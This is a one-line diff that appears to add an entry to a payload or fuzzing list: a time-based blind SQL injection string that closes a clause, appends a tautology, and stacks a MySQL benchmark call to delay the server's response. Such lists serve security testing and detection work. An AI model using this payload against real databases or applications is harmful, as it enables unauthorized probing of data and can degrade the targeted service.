@@ -1,0 +1,1 @@
+1) where 1622=1622;select benchmark(5000000,md5(0x4c4d6142))--
